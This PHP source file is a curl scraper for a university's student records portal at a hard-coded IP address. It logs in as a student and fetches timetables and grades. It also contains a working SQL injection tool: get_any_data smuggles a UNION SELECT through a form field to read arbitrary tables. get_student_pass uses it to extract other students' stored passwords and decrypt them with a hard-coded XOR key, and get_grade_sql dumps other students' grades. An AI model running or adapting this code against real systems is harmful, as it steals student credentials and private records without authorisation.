<?php
require_once('simple_html_dom.php');
class get_data_curl{
    private $randstring;
    private $viewstate;
    private $result;
    private $reg='/\(([^()]+|(?R))*\)/';
    private $url;
    private $user;
    private $useragent='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)';
    private $key='Encrypt01';
    private $error='';
    private $week = array(
        array("Sunday", "周日"),
        array("Monday", "周一"),
        array("Tuesday", "周二"),
        array("Wednesday", "周三"),
        array("Thursday", "周四"),
        array("Friday", "周五"),
        array("Saturday", "周六")
    );

    //执行CURL操作
    private function curl_get($post='',$opt=array()){
        $ch = curl_init();
        if($opt){
            curl_setopt_array($ch, $opt);
        }
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $this->useragent);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if($post){
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        $this->result=curl_exec($ch);
        //curl_close($ch);
        if($this->result){
            curl_close($ch);
            return true;
        }else{
            $this->error=curl_error($ch);
            curl_close($ch);
            //$this->error='Can not open the url!</br>'.$this->url;
            return false;
        }
    }

    //获取万恶的__VIEWSTATE
    private function get_viewstate(){
        $html=str_get_html($this->result);
        $e=$html->find('input[name=__VIEWSTATE]',0);
        $this->viewstate=urlencode($e->value);
        $html->clear();
        if($this->viewstate){
            return true;
        }else{
            $this->error='Failed to get Viewstate!';
            return false;
        }
    }

    //获得主页随机字符串和万恶的__VIEWSTATE
    private function get_string(){
        $this->url="http://218.199.176.2/";
        if(!$this->curl_get()){
            return false;
        }
        $this->get_viewstate();
        if(preg_match_all($this->reg,$this->result,$matches))
        {
            $this->randstring=$matches[0][0];
        }
        if(!$this->randstring){
            return false;
        }
        return true;
    }

    //登陆教务平台
    public function login($user,$pass,$name){
        if(!$this->get_string()){
            $this->error='Failed to get random strings!';
            return false;
        }
        sleep(6);
        $this->url="http://218.199.176.2/{$this->randstring}/default2.aspx";
        $data = "__VIEWSTATE={$this->viewstate}&TextBox1={$user}&TextBox2={$pass}&RadioButtonList1=%D1%A7%C9%FA&Button1=";
        if(!$this->curl_get($data)){
            return false;
        }
        if(strpos($this->result,'xs_main.aspx')){
            $this->user=$user;
            $this->name=$name;
            return true;
        }else{
            return false;
        }
    }

    //解密密码（倒序）
    private function ReverseStr($str){
        $str=implode(array_reverse(str_split($str,1)));
        return $str;
    }
    //解密密码（主体）
    public function Decode($PlainStr){
        $key=$this->key;
        $Pos=1;
        if(strlen($PlainStr)%2 == 0){
            $Side1 = $this->ReverseStr(substr($PlainStr,0,strlen($PlainStr)/2));
            $Side2 = $this->ReverseStr(substr($PlainStr,strlen($PlainStr)/2));
            $PlainStr = $Side1.$Side2;
        }

        $size = strlen($PlainStr);
        for($i=1;$i<=$size;$i++){
            $strChar = substr($PlainStr,$i-1,1);
            $KeyChar = substr($key,$Pos-1,1);

            $bl_1 = (ord($strChar) ^ ord($KeyChar)) < 32? 1:0;
            $bl_2 = (ord($strChar) ^ ord($KeyChar)) > 126? 1:0;
            $bl_3 = (ord($strChar) < 0? 1:0) | ($bl_1 | $bl_2);
            $bl_4 = (ord($strChar) > 0xFF? 1:0) | $bl_3;
            if($bl_4){
                $NewStr .= $strChar;
            }else{
                $ch = ord($strChar) ^ ord($KeyChar);
                $str = "";
                $str .= chr($ch);
                $NewStr .= $str;
            }
            if(strlen($key) == $Pos){
                $Pos = 0;
            }
            $Pos += 1;
        }
        $jiemi = $NewStr;
        return $jiemi;
    }

    //获取任意数据
    public function get_any_data($item=array(),$table,$condition='',$start='',$limit=''){
        $this->url="http://218.199.176.2/{$this->randstring}/xxjsjy.aspx?xh={$this->user}&xm={$this->name}&gnmkdm=N121611";
        //----一次访问----获取页面VIEWSTATE----
        $opt=array(
            CURLOPT_REFERER => "http://218.199.176.2/{$this->randstring}/xs_main.aspx?xh={$this->user}"
        );
        if(!$this->curl_get('',$opt)){
            return false;
        }
        $this->get_viewstate();
        //----二次访问----SQL注入-----------------
        $sql = "1 union select NULL,";
        foreach($item as $value){
            $sql .=  $value."||'||'||";
        }
        $sql=substr($sql,0,-8);
        $condition = $condition ? 'and '.$condition : NULL;
        if($start && $limit){
            $sql .= " from (select rownum r,a.* from $table a where 1=1 $condition and rownum<={$limit}) where r>{$start}";
        }else if($start){
            $sql .= " from $table where 1=1 $condition and rownum>=$start";
        }else if($limit){
            $sql .= " from $table where 1=1 $condition and rownum<=$limit";
        }else{
            $sql .= " from $table where 1=1 $condition";
        }
        //echo $sql;
        $sql=urlencode($sql);
        $data="__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={$this->viewstate}&xiaoq=&jslb=&min_zws=0&max_zws={$sql}&Button5=+%C8%B7%B6%A8+&xn=2013-2014&xq=1&js=&kssj=11&jssj=11&xqj=1&sjd=%271%27%7C%271%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27";
        $opt=array(
            CURLOPT_REFERER => "http://218.199.176.2/{$this->randstring}/xxjsjy.aspx?xh={$this->user}&xm={$this->name}&gnmkdm=N121611"
        );
        if(!$this->curl_get($data,$opt)){
            return false;
        }
        $result=iconv("GB2312","UTF-8"."//IGNORE",$this->result);
        $html=str_get_html($result);
        $tmpdata=$html->find('select[name=js]',0);
        foreach($tmpdata->find('option') as $row){
            $arr[]=explode('||',$row->innertext);
        }
        $html->clear();
        $tmpdata->clear();
        return $arr;
    }

    //获取密码
    public function get_student_pass($studentid){
        $item = array('mm', 'xm');
        $data = $this->get_any_data($item, 'xsjbxxb', "xh = '$studentid'");
        $data[0][0] = $this->Decode($data[0][0]);
        return $data[0];
    }

    //获取在校学习成绩（SQL注入）
    public function get_grade_sql($user,$start='',$stop=''){
        $item=array('xh','xn','xq','qmcj','pscj','sycj','cj','cxbj','cxcj','bkcj','xf','jd','bz','kcmc','xkkh','kcdm','kcxz','kcgs');
        if($user){
            $condition="xh like '$user'";
        }else{
            $condition=NULL;
        }
        $gradearr=$this->get_any_data($item,'cjb',$condition,$start,$stop);
        return $gradearr;
    }

    public function print_error(){
        echo $this->error;
    }

    public function get_error(){
        return $this->error;
    }

    //获取在校学习成绩（按学号）
    public function get_grade($user){
        $this->url="http://218.199.176.2/{$this->randstring}/cjcx.aspx?xh={$this->user}&xm={$this->name}&gnmkdm=N121610";
        //----一次访问----获取查分页面VIEWSTATE----
        $opt=array(
            CURLOPT_REFERER => "http://218.199.176.2/{$this->randstring}/xs_main.aspx?xh={$this->user}"
        );
        if(!$this->curl_get('',$opt)){
            return false;
        }
        $this->get_viewstate();
        //----二次访问----获取学号-----------------

        $data="__VIEWSTATE={$this->viewstate}&Dropdownlist5=--%3E%C7%EB%D1%A1%D4%F1%D1%A7%D4%BA%3C--&Dropdownlist3=a.xh&TextBox1={$user}&Button5=%B2%E9++%D1%AF&DropDownList1=2000-2001&DropDownList2=1";
        $opt=array(
            CURLOPT_REFERER => "http://218.199.176.2/{$this->randstring}/cjcx.aspx?xh={$this->user}&xm={$this->name}&gnmkdm=N121610"
        );
        if(!$this->curl_get($data,$opt)){
            return false;
        }
        $this->get_viewstate();

        //----三次访问----获取分数-----------------
        $data="__VIEWSTATE={$this->viewstate}&Dropdownlist5=--%3E%C7%EB%D1%A1%D4%F1%D1%A7%D4%BA%3C--&Dropdownlist3=a.xh&TextBox1=&Dropdownlist4={$user}&DropDownList1=2000-2001&DropDownList2=1&Button2=%D4%DA%D0%A3%D1%A7%CF%B0%B3%C9%BC%A8%B2%E9%D1%AF";
        $opt=array(
            CURLOPT_REFERER => "http://218.199.176.2/{$this->randstring}/cjcx.aspx?xh={$this->user}&xm={$this->name}&gnmkdm=N121610"
        );
        if(!$this->curl_get($data,$opt)){
            return false;
        }
        //数据处理，转化为UTF-8并放进数组
        $result=iconv("GB2312","UTF-8"."//IGNORE",$this->result);
        $html=str_get_html($result);
        $table=$html->find('table[class=datelist]',0);
        $i=0;
        foreach($table->find('tr[class!=datelisthead]') as $e){
            foreach($e->find('td') as $value){
                if($i!=0){
                    $content[$i][]=$value->innertext;
                }
            }
            $i++;
        }
        return $content;
    }

    //获取课表
    public function get_curriculum($year, $term){
        $this->url="http://218.199.176.2/{$this->randstring}/tjkbcx.aspx?xh={$this->user}&xm={$this->name}&gnmkdm=N121613";
        //----一次访问----获取课表页面VIEWSTATE及各种代码----
        $opt=array(
            CURLOPT_REFERER => "http://218.199.176.2/{$this->randstring}/xs_main.aspx?xh={$this->user}"
        );
        if(!$this->curl_get('',$opt)){
            return false;
        }
        $result=iconv("GB2312","UTF-8"."//IGNORE",$this->result);
        $html=str_get_html($result);
        $table=$html->find('table[id=Table6]', 0);
        $i = 0;
        foreach($table->find('tr') as $row){
            foreach($row->find('td') as $line){
                if($line->innertext == '上午' || $line->innertext == '下午'){
                    $i--;
                }
                if(strpos($line->innertext, '<br>')){
                    $tmp = explode('<br>', $line->innertext);
                    //print_r($tmp);
                    preg_match("/\d+-\d+/", $tmp[1], $week);
                    $week = explode('-', $week[0]);
                    preg_match("/\(\d,\d\)|\(\d\)/", $tmp[1], $time);
                    $time = str_replace(array('(', ')'), array('', ''), $time[0]);
                    $time = explode(',', $time);
                    if(strpos($line->innertext, '单')){
                        $switch = 1;
                    }
                    else if(strpos($line->innertext, '双')){
                        $switch = 2;
                    }
                    else{
                        $switch = 0;
                    }
                    if($i == 8){
                        $j = 0;
                    }else{
                        $j = $i;
                    }
                    foreach($time as $t){
                        $list[] = array(
                            'weekday' => $this->week[$j][0],
                            'title' => $tmp[0],
                            'startWeek' => $week[0],
                            'stopWeek' => $week[1],
                            'time' => $t,
                            'switch' => $switch,
                            'teacher' => $tmp[2],
                            'area' => $tmp[3]
                        );
                    }
                }
                $i++;
            }
            $i = 0;
        }
        return $list;
    }

}
?>
